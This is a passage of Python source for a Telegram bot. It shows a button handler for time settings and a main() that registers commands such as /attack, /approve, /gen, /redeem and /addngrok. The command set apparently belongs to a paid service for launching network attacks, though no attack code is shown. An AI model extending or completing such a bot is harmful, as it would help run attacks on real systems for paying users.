        f"👤 *Admin:* {full_name} (Username: @{username}, User ID: {request_user_id})\n"
        f"📄 *Details:* Listed all redeem codes.",
        update
    )
    # Function to handle button clicks
# Function to handle button clicks
async def button(update: Update, context: CallbackContext):
    query = update.callback_query
    await query.answer()  # Acknowledge the callback query

    chat_id = query.message.chat_id
    user_id = query.from_user.id
    username = query.from_user.username
    full_name = query.from_user.full_name
    data = query.data

    if data == 'default_time':
        # Set the default time for the user
        context.user_data['time_mode'] = 'default'
        await query.edit_message_text(text="*✅ Default time setting selected.*", parse_mode='Markdown')
        await log_interaction(
            context,
            f"🕒 *Time Setting Selected*\n"
            f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
            f"📄 *Details:* User selected default time setting.",
            update
        )

    elif data == 'custom_time':
        # Set the customizable time for the user
        context.user_data['time_mode'] = 'custom'
        await query.edit_message_text(text="*✅ Customizable time setting selected.*", parse_mode='Markdown')
        await log_interaction(
            context,
            f"🕒 *Time Setting Selected*\n"
            f"👤 *User:* {full_name} (Username: @{username}, User ID: {user_id})\n"
            f"📄 *Details:* User selected customizable time setting.",
            update
        )
    # Add more button handling cases as needed
    # Main function to start the bot
def main():
    logging.info('Starting the bot...')
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Add command handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("approve", approve))
    application.add_handler(CommandHandler("remove", remove_user))
    application.add_handler(CommandHandler("users", show_users))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(CommandHandler("time", time_command))
    application.add_handler(CommandHandler("config", show_config))
    application.add_handler(CommandHandler("updateconfig", update_config))
    application.add_handler(CommandHandler("gen", generate_redeem_code))
    application.add_handler(CommandHandler("redeem", redeem_code))
    application.add_handler(CommandHandler("deletecode", delete_code))
    application.add_handler(CommandHandler("listcodes", list_codes))
    application.add_handler(CommandHandler("cleanup", cleanup))
    application.add_handler(CommandHandler("listngrok", list_ngrok))
    application.add_handler(CommandHandler("addngrok", add_ngrok))
    application.add_handler(CommandHandler("removengrok", remove_ngrok))

    # Add callback query handler
    application.add_handler(CallbackQueryHandler(button))

    # Add message handler for handling new settings
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_setting))

    # Start the bot
    application.run_polling()

if __name__ == '__main__':
    main()
